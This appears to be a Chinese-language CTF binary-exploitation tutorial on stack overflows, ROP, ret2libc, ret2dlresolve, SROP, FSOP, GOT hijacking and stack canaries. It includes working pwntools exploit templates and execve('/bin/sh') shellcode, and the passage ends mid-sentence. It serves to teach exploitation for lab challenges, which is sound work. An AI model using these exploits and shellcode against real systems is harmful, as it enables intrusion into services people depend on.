*context.update(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;) #64位x86程序# context.update(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;) 32位x86程序elf = ELF(&#x27;./vuln&#x27;, checksec=False)# r = process(&#x27;./vuln&#x27;)r = remote(&quot;Host&quot;,Port) r.recvuntil(b&#x27;:&#x27;)payload = b&quot;A&quot;*64 + b&quot;B&quot;*4 + p64()r.sendline(payload)r.interactive() Ropgadget用于高效准确查找gadgets。 下载： 1sudo apt install python3-ropgadget 用法： 1ROPgadget --binary ./vuln | grep -E &quot;pop rdi ; ret&quot; 漏洞以及利用方法一般pwn题的核心漏洞主要分为2种：（概况地比较笼统） 不安全的输入/边界处理（从而导致溢出，格式化字符串漏洞等问题） 状态/权限/生命周期等逻辑设计或实现错误（比如最普通的Use-After_Free） 我们需要利用这些漏洞来修改程序的执行流程，从而达到读取flag或者拿到shell的目的。 下面主要分成3部分来讲： 溢出（主要关注栈溢出） 格式化字符串漏洞 堆利用 溢出 Buffer OverflowBuffer overflow（缓冲区溢出）漏洞常见于不做边界检查或边界检查错误的输入/拷贝函数；可覆盖栈/堆/静态区中的相邻数据（如返回地址、函数指针、对象元数据等）。 当然初次之外还有很多溢出的漏洞表现，比如说整数溢出导致的越界写入等。 而如果溢出是发生在栈上的话，称为栈溢出。常见的利用方法是通过溢出修改栈中相邻的内容，如返回地址等。 （栈溢出的定义：指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。） 比较简单常见的栈溢出的例子的就是，程序给某个变量在栈上分配了一个固定大小的内存，但是程度接收输入时没有仔细检查，导致我们可以将超过这个内存大小的内容写入进这个变量，于是它会覆盖其更高地址的内容。 漏洞/常见危险函数 gets() 没有任何输入长度限制/检查。 fgets(buf, size, stdin) 如果size大于给buf的实际大小，则会溢出。 12char buf[32];fgets(buf, 128, stdin); scanf(&quot;%s&quot;, buf) %s 会不断读入字符直到遇到空白符（空格、回车、制表符等）。 安全写法： 1scanf(&quot;%15s&quot;, buf); // 最多读 15 个字节 + 1 个 &#x27;\\0&#x27; read(0, buf, count) 如果count大于给buf的实际大小，则会溢出。 12char buf[32];read(0, buf, 0x100); 结构体字段劫持最简单的攻击目的便是修改写入变量附近的某个变量的值。比如说在下面这个例子里： 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;struct user &#123; char name[64]; int is_admin;&#125;;void win() &#123; printf(&quot;You are admin!\\n&quot;); system(&quot;/bin/flag&quot;);&#125;int main() &#123; struct user u; memset(&amp;u, 0, sizeof(u)); printf(&quot;Enter your name: &quot;); fgets(u.name, 200, stdin); // name只有64字节，fgets读200字节 if (u.is_admin == 1) &#123; win(); &#125; else &#123; printf(&quot;Access denied.\\n&quot;); &#125; return 0;&#125; 我们写入的变量为user这个struct里的name，但是由于输入长度限制为200，而实际的name的存储空间仅为64，并且struct里的内容的存储空间是连续的，所以可以通过输入 123&#x27;A&#x27;*64 + &#x27;\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#x27;# 也可以用&#x27;A&#x27;*64 + p64(1) 将原本的is_admin的值修改为（被覆盖掉为）1。（注意大部分架构都是使用的小端序，并且int的大小为4个Byte，所以是\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00） ROP（Return Oriented Programming）ROP（返回导向编程）指的是我们通过漏洞覆盖返回地址，并在栈上布置一条返回链（ROP Chain），使程序在不断执行ret时依次跳转到一系列以ret结尾的gadget，从而把程序/库中已有的指令片段组合成所需的执行流程（例如调用system、触发syscall、ORW读flag等）。 因为要覆盖修改返回地址，所以我们需要精确计算我们注入的起始点到返回地址的偏移。 比如说在这个例子里： 123| buf | 0x20| saved RBP | 0x08| ret | 偏移就是0x28。这个偏移很多时候也可以用IDA直接查看栈结构来得到，只不过偶尔IDA的偏移会不准确，这个时候就只能依靠GDB调试来确认。 这个时候通过 1payload = b&quot;A&quot; * 0x28 + p64(fake_ret_addr) 就可以将返回地址修改成fake_ret_addr。 需要注意的是，如果栈溢出的漏洞点是在函数fun()的栈上，那么当fun()执行完之后才会跳转（返回）至我们给定的fake_ret_addr。main()函数的话同理，因为main()函数也有返回地址。 ret2textret2text（Return-to-Text）即控制程序执行程序本身已有的的代码 (即， .text 段中的代码) 。 这种Exploit一般需要： 1Stack: No canary found 如果开启了PIE，则需要先泄露基址，再计算所需函数的实际地址。 例子（假设程序中原本有一个不需要参数的win()函数，它会调用system(&quot;/bin/sh&quot;)。）： 123win_address = 0x0000000000401172 # win函数地址0x401172payload = b&quot;A&quot; * offset_to_ret_addr # 一路覆盖到返回地址前payload += p64(win_address) ret2shellcodeShellcodeshellcode是一段用于利用软件漏洞而执行的16进制机械码，以其经常让攻击者获得shell而得名。（维基上的定义：https://zh.wikipedia.org/wiki/Shellcode） 比较常用的： 1. 123from pwn import *shellcode = asm(shellcraft.sh()) # /bin/sh 2. 123456789sc = asm(&quot;&quot;&quot; xor rsi, rsi xor rdx, rdx mov rbx, 0x68732f6e69622f push rbx mov rdi, rsp mov al, 59 syscall&quot;&quot;&quot;) 3. 24位的shellcode（来源：https://www.exploit-db.com/exploits/43550 ）： 1234567891011121314151617181920212223242526272829/*global _startsection .text_start: push 59 pop rax cdq push rdx mov rbx,0x68732f6e69622f2f push rbx push rsp pop rdi push rdx push rdi push rsp pop rsi syscall*/#include &lt;stdio.h&gt;#include &lt;string.h&gt;char code[] = &quot;\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05&quot;;// char code[] = &quot;\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05&quot;;int main()&#123; printf(&quot;len:%d bytes\\n&quot;, strlen(code)); (*(void(*)()) code)(); return 0;&#125; 4. 23位的shellcode（来源：https://www.exploit-db.com/exploits/36858 ）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263/* # # Execve /bin/sh Shellcode Via Push (Linux x86_64 23 bytes) # # Dying to be the shortest. # # Copyright (C) 2015 Gu Zhengxiong (rectigu@gmail.com) # # 27 April 2015 # # GPL # .global _start_start: # char *const argv[] xorl %esi, %esi # &#x27;h&#x27; &#x27;s&#x27; &#x27;/&#x27; &#x27;/&#x27; &#x27;n&#x27; &#x27;i&#x27; &#x27;b&#x27; &#x27;/&#x27; movq $0x68732f2f6e69622f, %rbx # for &#x27;\\x00&#x27; pushq %rsi pushq %rbx pushq %rsp # const char *filename popq %rdi # __NR_execve 59 pushq $59 popq %rax # char *const envp[] xorl %edx, %edx syscall *//* gcc -z execstack push64.c uname -r 3.19.3-3-ARCH */#include &lt;stdio.h&gt;#include &lt;string.h&gt;intmain(void)&#123; char *shellcode = &quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56&quot; &quot;\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot;; printf(&quot;strlen(shellcode)=%d\\n&quot;, strlen(shellcode)); ((void (*)(void))shellcode)(); return 0;&#125; ret2shellcoderet2shellcode（Return-to-Shellcode）指的是：在利用栈溢出等漏洞时，将自己编写的shellcode注入到内存（常见是栈/堆/.bss）里，再通过覆盖返回地址或利用跳转gadget（如 jmp *sp）把控制流重定向到该shellcode，从而直接执行任意指令。 先只关注将shellcode写入stack并执行： 这种Exploit一般需要： 1234NX: NX enabled #重中之重Stack: No canary foundPIE: No PIE (0x400000) 我们分成开启/关闭ASLR的2种情况来讨论。 1. 开启ASLR： 12345678910int main()&#123; char buf[0x30] = &#123; 0 &#125;; printf(&quot;%p\\n&quot;, buf); printf(&quot;&gt;&quot;); fflush(stdout); read(fileno(stdin), buf, 0x50); return 0;&#125; 假设我们可以获取到在stack上的buf的地址（在这个例子里程序会直接给我们） 所以可以构造这样的payload： 123from pwn import *sc = asm(shellcraft.sh())payload = sc.ljust(0x48, b&quot;A&quot;) + p64(buf_addr) 先将shellcode写进buf，然后修改返回地址让程序跳转至buf的位置执行shellcode。 假如无法直接获得buf的地址，但是buf的地址会被存进rsi之类的寄存器，且程序里有类似jmp rsi的gadget。这种情况下我们就可以利用这个gadget跳转至buf的位置： 1234567891011from pwn import *shellcode = asm(shellcraft.sh()) # /bin/sh# 找到 jmp rsi 指令地址JMP_RSI = next(elf.search(asm(&#x27;jmp rsi&#x27;)))payload = flat(&#123; 0: shellcode, # shellcode 256: JMP_RSI # 溢出 return address&#125;) 2. 关闭ASLR： 由于关闭了ASLR，所以我们可以在将shellcode写入进stack后直接通过爆破栈地址来执行shellcode。 如果按照这样的Payload结构： 1[Shellcode] [Return Address] 来爆破地址的话，效率会非常低，因为我们必须精确地爆破到Shellcode（buf）一开始的地址，地址高一位低一位都会失败。 为了提高爆破效率以及成功率，我们可以利用一个叫做NOP Sled的方法： NOP 是 “No Operation”（不执行任何操作）的缩写，意思就是“空指令”。CPU执行一条NOP 后，什么状态都不改，只把程序计数器往前挪到下一条指令。 在 x86 上，最常见的NOP的机器码是0x90。 而当我们将一段很长的NOP添加在我们shellcode前面，就会让我们爆破的难度大大降低。因为我们不再需要精准地返回到shellcode一开始的地址，只要它返回到NOP中的任意位置，就会自动“滑“（这也是“sled”“雪橇”这个词的由来）到后面的shellcode并执行它。 优化后的shellcode的结构： 1[Padding] [Return Address] [NOP] [Shellcode] 或者 1[NOP] [Shellcode] [Return Address] 这样一来，我们爆破地址的中间的间隔可以直接设置成NOP的长度，这样并不会错过我们的NOP以及Shellcode，确保了爆破一定能成功并且提高了爆破的效率。 只不过NOP sled的长度会受限于overflow漏洞的长度。如果是scanf之类任意长度写入的漏洞，则sled可以非常长，效率也会更高。 1234567from pwn import *sc = asm(shellcraft.sh())NOP_len = 0x100NOP = b&#x27;\\x90&#x27; * NOP_lencode = NOP + scpayload = b&#x27;A&#x27;*0x38 + p64(addr_int) + code ret2pltret2plt指的是：通过覆盖返回地址，跳转到程序的PLT (Procedure Linkage Table)表项中执行特定的函数。 也就是说我们会用程序里已经有（调用过）的函数和gadget来构造ROP，所以常用于程序里已经调用过system函数的情况。 我们分几种情况讨论： 1. 假设程序里有system函数和&quot;/bin/sh&quot;字符串，并且有pop rdi ; ret这个gadget。 我们可以这样构造payload，直接调用system，然后通过pop rdi ; ret把&quot;/bin/sh&quot;字符串作为参数传递给它： 1234567891011121314from pwn import *elf = context.binary = ELF(&#x27;./challenge&#x27;)pop_rdi = p64(next(elf.search(asm(&#x27;pop rdi ; ret&#x27;, arch=&#x27;amd64&#x27;))))bin_sh = p64(0x400808) #&quot;/bin/sh&quot;字符串的地址ret = p64(next(elf.search(asm(&#x27;ret&#x27;, arch=&#x27;amd64&#x27;))))system = p64(elf.sym[&#x27;system&#x27;])payload = b&quot;A&quot;*(0xA+8) + pop_rdi + bin_sh + ret + system# ret是为了栈对齐，有些时候需要加，有些时候不需要，看具体程序 如果没有&quot;/bin/sh&quot;，&quot;sh&quot;也可以拿来用。在大部分情况下这两个字符串作为传递给system的参数在功能上是没有区别的。 123456pop_rdi = p64(next(elf.search(asm(&#x27;pop rdi ; ret&#x27;, arch=&#x27;amd64&#x27;))))sh = p64(next(elf.search(b&#x27;sh&#x27;)))ret = p64(next(elf.search(asm(&#x27;ret&#x27;, arch=&#x27;amd64&#x27;))))system = p64(elf.sym[&#x27;system&#x27;])payload = b&quot;A&quot;*(0xA+8) + pop_rdi + sh + ret + system 2. 假设程序里有system函数，pop rdi ; ret这个gadget，以及一个写入的函数（比如说gets，read，scanf等）。 12345678910111213141516171819202122232425from pwn import *elf = context.binary = ELF(&#x27;./challenge&#x27;)sys_add = elf.plt[&#x27;system&#x27;]gets_add = elf.plt[&#x27;gets&#x27;]# 为了防止覆盖 .bss 开头的关键变量，通常建议加一个偏移量，比如 +0x100data_add = elf.bss() + 0x100 pop_rdi = next(elf.search(asm(&#x27;pop rdi ; ret&#x27;)))payload = b&quot;A&quot;*offset# 将data块的地址作为参数传递给gets函数并调用gets# 将&quot;/bin/sh&quot;写入data块payload += p64(pop_rdi)payload += p64(data_add)payload += p64(gets_add)# 第二轮ROP# 将刚写入的data里的&quot;/bin/sh&quot;作为参数传递给system()函数payload += p64(pop_rdi)payload += p64(data_add)payload += p64(sys_add) ret2libcret2libc（Return-to-Library）指的是：在存在栈溢出等漏洞、但无法直接执行注入的shellcode（通常因为DEP/NX保护禁止在栈上执行代码）的情况下，攻击者将程序的控制流劫持到libc库中的现成函数/字符串，比如 system()、/bin/sh，从而达到执行任意命令的目的。 因为需要利用libc的函数，所以一般攻击流程分为2步： 泄露libc基址 利用libc基址计算所需函数/gadget的正确地址并构造ROP链 1. 假如服务器关闭了ASLR，那么就可以直接爆破libc的基址： 12345678910111213libc = ELF(&#x27;./libc-2.41.so&#x27;)for libc_base in range(0x7ffff7dff000,0x7ffff7d00000,-0x1000): system_addr = libc_base + libc.symbols[&#x27;system&#x27;] binsh_addr = libc_base + next(libc.search(b&#x27;/bin/sh\\x00&#x27;)) rop_libc = ROP(libc) pop_rdi = libc_base + rop_libc.find_gadget([&#x27;pop rdi&#x27;,&#x27;ret&#x27;]).address ret = libc_base + rop_libc.find_gadget([&#x27;ret&#x27;]).address payload = b&#x27;A&#x27;*0x58 payload += p64(pop_rdi) + p64(binsh_addr) + p64(ret) + p64(system_addr) ret需要看情况，因为有栈对齐的问题，所以有些时候需要加有些时候不需要。 2. 正常开启ASLR的情况： 一般情况是通过先泄露某个函数的实际地址，然后通过这个地址计算libc的实际base地址，最后再计算其他所需的地址。 例子：（假设泄露出了prinft的实际地址） 1234567891011121314libc = ELF(&#x27;./libc-2.41.so&#x27;)libc_base = printf_addr - libc.symbols[&#x27;printf&#x27;]system_addr = libc_base + libc.symbols[&#x27;system&#x27;]binsh_addr = libc_base + next(libc.search(b&#x27;/bin/sh\\x00&#x27;))rop_libc= ROP(libc)g_pop = rop_libc.find_gadget([&#x27;pop rdi&#x27;, &#x27;ret&#x27;])g_ret = rop_libc.find_gadget([&#x27;ret&#x27;])POP_RDI = libc_base + g_pop.addressRET = libc_base + g_ret.addresspayload = b&#x27;A&#x27;*0x58payload += p64(POP_RDI) + p64(binsh_addr) + p64(RET) + p64(system_addr) ret2dlresolveret2dlresolve 是一种利用 Linux 动态链接器（Dynamic Linker）的延迟绑定（Lazy Binding）机制来劫持程序控制流的技术。 核心优势： 不需要泄露 libc 基址。即便服务器开启了 ASLR，只要程序没有开启 Full RELRO（即开启了延迟绑定），且我们有一个可控的栈溢出和一块已知地址的可写内存（如 .bss），我们就可以利用这个技术伪造解析请求，让动态链接器帮我们“解析”出 system 函数的地址并直接调用。 原理简述： 回顾背景知识中提到的延迟绑定过程： 当程序第一次调用 printf@plt 时，最终会调用 _dl_runtime_resolve(link_map, reloc_index)。 link_map：链表结构的指针，包含库的信息。 reloc_index（在32位是偏移，64位是索引）：用于在重定位表（.rel.plt / .rela.plt）中找到修正信息。 正常流程是： 链接器根据 reloc_index 找到重定位表项。 根据表项中的索引找到符号表（Symbol Table）项。 根据符号表项中的索引找到字符串表（String Table）中的函数名（如 “printf”）。 链接器去 libc 里查找 “printf”，算出实际地址，填回 GOT 表并调用。 漏洞利用点： _dl_runtime_resolve 极其“信任”传入的 reloc_index。 如果我们传入一个非常大的、精心计算的 reloc_index，使其越界指向我们自己在 .bss 段伪造的数据结构： 伪造的重定位表项 -&gt; 指向伪造的符号表项。 伪造的符号表项 -&gt; 指向伪造的字符串（内容为 “system”）。 那么链接器就会地去libc里查找 “system”并调用它。 手动构造 ret2dlresolve 的 payload 非常麻烦，尤其是在 64 位环境下，还需要处理复杂的结构体对齐和版本检查问题。不过好在pwntools里有现成的payload构造函数Ret2dlresolvePayload。 Exploit模板： 12345678910111213141516171819202122232425262728293031323334353637from pwn import *elf = context.binary = ELF(&#x27;./challenge&#x27;)# 1. 确定一个可写且已知地址的区域，通常用 .bss + 偏移# 确保这个区域足够大，用来存放我们伪造的结构体数据rop_addr = elf.bss() + 0x100# 2. 初始化 Ret2dlresolvePayload 对象# symbol: 我们想要调用的函数# args: 函数的参数dlresolve = Ret2dlresolvePayload(elf, symbol=&quot;system&quot;, args=[&quot;/bin/sh&quot;])# 3. 构造 ROProp = ROP(elf)# 步骤 A: 将伪造的数据结构写入 .bss (利用 read 或 gets 等)# dlresolve.data_addr 是 pwntools 自动计算出的存放伪造数据的地址# dlresolve.payload 包含了所有伪造的表项和字符串rop.read(0, dlresolve.data_addr, len(dlresolve.payload))# 步骤 B: 调用 ret2dlresolve# 这会自动生成调用 plt[0] 以及传递伪造 index 的 ROP 链rop.ret2dlresolve(dlresolve)# 4. 发送 Payloadraw_rop = rop.chain()# 这里的 padding 视题目具体的溢出偏移而定payload = b&#x27;A&#x27; * offset payload += raw_rop# 注意：这里需要先把 fake data 拼接到后面，或者分两次发送# 因为上面的 rop.read 会读取这些数据payload += dlresolve.payload r.sendline(payload)r.interactive() SROPSROP (Sigreturn Oriented Programming) 的核心在于利用Linux内核的一个机制：系统调用rt_sigreturn (Syscall number 15)。 什么是 rt_sigreturn？ 当Linux进程处理信号（Signal）时，内核会把当前所有的寄存器状态（Context）保存到栈上，形成一个 SigreturnFrame，然后去执行信号处理函数。 当处理函数执行完，程序需要恢复原来的状态，就会调用 rt_sigreturn。 重点：rt_sigreturn 会无脑地从栈上读取数据，并把它们填回 CPU 的所有寄存器（RIP, RSP, RDI, RSI, RAX, …）。 所以当我们手动伪造一个SigreturnFrame放在栈上，然后强行触发syscall 15，内核就会把我们要执行的恶意参数（比如 execve(&quot;/bin/sh&quot;)）全部加载进寄存器。 我们来看一个简单的例子： 12345678910111213141516171819202122global _startsection .text_start: ; [1] Leak Stage ; write(1, rsp, 8) mov rax, 1 ; syscall: sys_write mov rdi, 1 ; fd: stdout mov rsi, rsp ; buf: rsp (当前栈顶) mov rdx, 8 ; count: 8 bytes syscallvuln_read: ; [2] Overflow Stage ; read(0, rsp, 500) mov rax, 0 ; syscall: sys_read xor rdi, rdi ; fd: stdin mov rsi, rsp ; buf: rsp (写回栈顶) mov rdx, 500 ; count: 500 bytes (足够大，容纳 Frame) syscall ret 程序首先会直接泄露rsp的内容（栈顶地址），而程序会将rsp指针所指位置的的8个字节当成返回地址。所以执行ret命令时，程序会返回（跳转）到rsp指针所指位置，并且将rsp的值+8（rsp+=8）。 我们分2步进行： 1. Payload A: 布置好假的 Frame，并让程序重新执行一次 read。 12345678910+-----------------------+ &lt;-- 栈顶 (RSP) (栈的最低地址)| Read_Addr | &lt;-- 指向代码段里vuln_read的部分的地址(程序会把这里的内容当成返回地址)+-----------------------+| 0 | &lt;-- 任意padding。+-----------------------+| || Fake SigreturnFrame | &lt;-- 伪造的寄存器表| (RAX=59, RDI=sh_addr)| (包含 /bin/sh 字符串)| |+-----------------------+ 2. Payload B: 仅仅为了控制 RAX 的值变成15，并触发 syscall。 1234567+-----------------------+| Read_Addr | +-----------------------+ &lt;-- 栈顶 (RSP) - 覆盖了 Payload A 的前 15 字节| Syscall_Ret_Addr | &lt;-- syscall; ret 的地址，对应上一轮中0的位置。(8 字节)+-----------------------+| Padding (7 bytes) | &lt;-- 7 字节填充+-----------------------+ 因为fake SigreturnFrame的前7位没有什么重要内容，所以被padding覆盖了也不影响。 第二轮执行结束后，因为程序读取了15个字节，所以rax的值会被设置成15，此时stack的内容： 123456+-----------------------+ &lt;-- 栈顶 (RSP)| || Fake SigreturnFrame | &lt;-- 伪造的寄存器表| (RAX=59, RDI=sh_addr)| (包含 /bin/sh 字符串)| |+-----------------------+ 也就是说，此时的 CPU 状态是： RIP：指向 syscall 指令。 RAX：15 (sys_rt_sigreturn)。 RSP：指向Fake Frame的开头。 所以程序会执行sys_rt_sigreturn，并且把我们的Fake Frame当成正常的SigreturnFrame，并且安装frame的内容重新设置寄存器的值。 1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *p = process(&#x27;./challenge&#x27;)elf = ELF(&#x27;./challenge&#x27;)vuln_read = elf.symbols[&#x27;vuln_read&#x27;]rop = ROP(elf)syscall_ret = rop.find_gadget([&#x27;syscall&#x27;, &#x27;ret&#x27;])[0]stack_addr = u64(p.recv(8))log.success(f&quot;Stack Address: &#123;hex(stack_addr)&#125;&quot;)frame = SigreturnFrame()frame.rax = 59 # execveframe.rdi = stack_addr + 8 + 8 + 40 # 计算字符串地址# 40是r8寄存器相对于Frame开头的距离 (Offset 0x28)。frame.rsi = 0frame.rdx = 0frame.rip = syscall_ret # 最后执行 syscall# 将字符串放入不重要的寄存器 r8frame.r8 = u64(b&#x27;/bin/sh\\x00&#x27;)payload_a = flat([ vuln_read, # ret 跳转回 read 0, bytes(frame) # 紧接着放 Frame])p.send(payload_a)sleep(0.1)payload_b = flat([ syscall_ret, # 8 bytes b&#x27;A&#x27; * 7 # 7 bytes padding])p.send(payload_b)p.interactive() FSOPFSOP (File Stream Oriented Programming，面向文件流的编程) 的核心在于劫持GLIBC中的标准输入输出流结构体：_IO_FILE。 什么是 _IO_FILE？ 在 Linux 中，每一个文件流（如 stdin, stdout, stderr 或你用 fopen 打开的文件）在底层都对应一个 _IO_FILE 结构体。为了实现多态，这个结构体的末尾包含一个名为 vtable 的虚函数表指针。 当程序执行 fread, fwrite, fclose 等操作时，它并不会直接调用某个固定函数，而是通过 vtable 找到对应的函数指针并跳转执行。 在 GLIBC 2.24 版本之前，系统不会对 vtable 的合法性进行任何检查。只要我们能控制 _IO_FILE 结构体的内容，就能通过修改 vtable 指针，让程序在执行文件操作（如 fclose）时，跳转到我们的 getshell 函数。 我们来看一个简单的例子： 12345678int main()&#123; buf[0] = (char *)getshell; // 预留跳转目标 fp = (FILE *)buf; // 强制类型转换，buf 被当做 FILE 结构体 read(0, buf, 0x820u); // 漏洞点：控制 buf 的内容 fclose(fp); // 触发点：调用 vtable 中的函数指针 return 0;&#125; 程序将 buf 强制转换为了 FILE * 指针。这意味着当我们执行 fclose(fp) 时，系统会从 buf 开始解析 _IO_FILE 结构体。 布局思路： 在 64 位系统中，_IO_FILE 结构体的长度大约是 0xD8 字节。我们需要在 buf 中布置以下关键数据： _flags (Offset 0x0)：设置为安全值（如 0xfbad208b 或 0），防止 fclose 逻辑提前终止。 _lock (Offset 0x88)：GLIBC 2.23 的 fclose 会触发加锁操作。我们需要让这个指针指向一块内容全为 \\x00 的可写内存（如 buf + 0x10），否则程序会崩溃。 vtable (Offset 0xd8)：这是重中之重。我们将它指向我们伪造的虚表地址（如 buf + 0x100）。 Fake Vtable (Offset 0x100)：在虚表的偏移 0x10 处填入 getshell 地址。因为 fclose 会调用 vtable 中的 _IO_FINISH（位于虚表第三项）。 Payload 布局如下： Plaintext 12345678910111213141516171819+-----------------------+ &lt;-- buf 起始地址 (fp 指向这里)| _flags | &lt;-- 8 字节 (0xfbad208b)+-----------------------+| Padding | +-----------------------+ &lt;-- buf + 0x88| _lock | &lt;-- 指向 buf+0x10 (确保该处为 0)+-----------------------+| Padding |+-----------------------+ &lt;-- buf + 0xd8| vtable | &lt;-- 指向虚表起始地址 (buf + 0x100)+-----------------------+| ...... |+-----------------------+ &lt;-- buf + 0x100 (Fake Vtable 开始)| dummy | &lt;-- 8 字节+-----------------------+| dummy | &lt;-- 8 字节+-----------------------+ &lt;-- buf + 0x110 (vtable + 0x10)| getshell | &lt;-- 这里是 _IO_FINISH，程序会跳转到这里+-----------------------+ Exploit 代码实现 12345678910111213141516171819202122232425262728293031323334from pwn import *p = remote(&#x27;&#x27;, )elf = ELF(&#x27;&#x27;)# 非 PIE 程序，直接获取符号地址buf_addr = elf.symbols[&#x27;buf&#x27;]getshell_addr = elf.symbols[&#x27;getshell&#x27;]log.info(f&quot;Buf Address: &#123;hex(buf_addr)&#125;&quot;)log.info(f&quot;Getshell Address: &#123;hex(getshell_addr)&#125;&quot;)# 1. 构造 _IO_FILE 结构体payload = p64(0xfbad208b) # _flags# 2. 绕过 lock 检查 (Offset 0x88)payload = payload.ljust(0x88, b&#x27;\\x00&#x27;)payload += p64(buf_addr + 0x10) # _lock 指向一块全零的地址# 3. 劫持 vtable 指针 (Offset 0xd8)fake_vtable_addr = buf_addr + 0x100payload = payload.ljust(0xd8, b&#x27;\\x00&#x27;)payload += p64(fake_vtable_addr) # vtable 指针# 4. 布置伪造的虚函数表 (Offset 0x100)# fclose 调用 vtable + 0x10 处的 _IO_FINISHvtable = p64(0) * 2 # dummyvtable += p64(getshell_addr) # 目标函数payload = payload.ljust(0x100, b&#x27;\\x00&#x27;) + vtable# 发送 Payload 触发 getshellp.send(payload)p.interactive() 劫持控制流/Control Flow Hijack劫持控制流（Control Flow Hijack）就是修改某个函数的GOT或者是PLT的内容。 由于GOT，PLT表的地址比栈的要低，所以无法通过栈溢出实现这种攻击，而是需要堆（Heap）上的溢出，或者是任意写入的漏洞。 我们来看一个简单的例子： 12345678910#define BUFSIZE 0x20uint32_t *array;int i;while (1)&#123; array = calloc(20, sizeof(*array)); // ... array[i] = atoi(buf); // ...&#125; 由于程序的漏洞，我们这里可以控制i和buf的内容。所以我们这里可以获得一个任意写入的权限。 假设我们通过其他办法得到了system函数的真实地址，那么我们就可以把atoi@got里的内容修改成system的地址，这样一来，当程序进行到atoi时，它会通过plt和got来调用got里写的函数地址，也就是system的地址。当我们再给buf输入&quot;/bin/sh&quot;的时候，程序执行原本的atoi(buf)时候实际上会执行system(buf)，由此拿到shell。 当程序没有循环的时候我们需要将程序结束前会调用的某个函数修改成main的地址，使得程序会循环运行main函数。 简单来讲，劫持控制流就是修改程序的got表里的内容，使得程序以为自己在运行函数fun1的时候，实际上在运行fun2，依次来达到目的。这种操作相对于ROP来讲会更加间接一点。在之后堆利用的部分会经常用到。 栈金丝雀/Stack Canary为了预防潜在的栈溢出的威胁，人们发明了名为Stack Canary（栈金丝雀）的安全机制。 名字的由来/历史背景： 在 19 世纪和 20 世纪早期，还没有先进的电子传感器。矿工下井挖掘煤矿时，最害怕的就是无色无味的一氧化碳 (CO)或瓦斯(甲烷)泄漏。一旦发现，通常为时已晚。 矿工们发现，金丝雀（Canary）这种鸟类对有毒气体极其敏感。由于它们的新陈代谢很快，只要空气中有一丁点毒气，金丝雀会比人类更早出现中毒反应（停止歌唱、晕倒甚至死亡）。 因此，矿工下井时会提着一个装着金丝雀的笼子，类似于一个警报器： 只要鸟还在叫，说明环境是安全的。 一旦鸟不叫了或倒下了，矿工就知道危险逼近，必须立即撤离。 回到计算机的部分： Stack Canary（栈金丝雀）的核心思想非常简单：在局部变量（缓冲区）和控制信息（如返回地址）之间放置一个随机生成的整数（即 Canary）。 在函数返回之前，系统会检查这个值是否被修改。如果发生了缓冲区溢出，攻击者的数据通常是从低地址向高地址覆盖的，那么在覆盖到返回地址之前，必然会先覆盖掉 Canary。一旦系统发现 Canary 变了，就会立即终止程序，从而阻止攻击。 比较有意思的是，我们可以做一个完美的对应（类似比喻的那种）： 现实世界 (煤矿) 计算机世界 (内存栈) 矿井 程序栈 (Stack) 矿工 返回地址 (Return Address) 毒气/瓦斯 缓冲区溢出数据 (Buffer Overflow) 金丝雀 (Canary) Canary值 (随机整数) 鸟死了 Canary值被修改 撤离矿井 程序终止 开启了canary的栈布局： 12345678910111213141516171819202122232425262728高地址 (High Address) 0xFF... ^ |+-----------------------+| || Return Address | &lt;-- 返回地址| (RIP / EIP) || |+-----------------------+| || Saved Frame Pointer | (保存的基址指针，如 EBP/RBP)| |+-----------------------+| || Stack Canary | &lt;-- Canary| 随机值 || |+-----------------------+| || || Local Variables | &lt;-- [溢出源头] buf| (Buffer / Array) || || |+-----------------------+ | v低地址 (Low Address) 0x00... 此外还有一点，在 Linux (GCC/glibc) 以及大多数现代操作系统的实现中，x86/x64架构下的Stack Canary的最低位（Least Significant Byte, LSB） 几乎总是被强制设置为0x00。 （因为x86/x64是小端序 (Little-Endian) 架构，所以最低位会被存在低地址，也就是上面结构里离局部变量最近的那位。） 这个 0x00 主要有两个防御目的，特别是针对 C 语言中常见的字符串操作函数： 防止泄漏 (Anti-Leak / Read Protection) C 语言的字符串打印函数（如 printf(&quot;%s&quot;, buf), puts(buf)）是依靠 \\0 (0x00) 来判断字符串结束的。 如果攻击者利用漏洞读取栈上的内容（例如 buffer 没有正确的结束符），程序会一直向高地址打印。 当打印遇到Canary的第一个字节 0x00 时，打印函数会认为“字符串结束了”，立即停止。 也就是说：我们只能读到填充的垃圾数据，而读不到 Canary 后面的 7 个随机字节。保护了 Canary 的秘密性。 防止特定写入 (Anti-Overwrite / Write Protection) 字符串复制函数（如 strcpy）遇到0x00会停止复制。 虽然这不能完全阻止缓冲区溢出（仍可以用 memcpy 或 read 这种不看 \\0 的函数来覆盖），但它限制了攻击者使用strcpy这类函数来精准修改Canary之后的返回地址而不破坏 Canary的难度。 栈金丝雀可以非常有效地防御那种连续性的overflow漏洞/线性溢出（Linear Overflow），但是仍有些情况它是照顾不到的： 1. 假如有信息泄露漏洞（比如 Format String 漏洞，或者可以越界读取 Stack 内容），那么我们就可以直接把canary的完整的值泄露出来，覆写时注意把canary部分覆写成正确的值即可。 2. 假如有数组越界写入漏洞（Out-of-Bound Write），那么就可以指定索引写入，从而直接绕过canary来修改返回地址等内容。 3. 假如常驻主程序使用fork()来生成子进程处理每个连接，并处理所有逻辑，那么就可以尝试爆破canary的值。 fork() 不会重新随机化 canary：父进程的 TLS/TCB（存 canary 的地方）会COW（copy on write）复制给子进程。 所以所有子进程的 canary 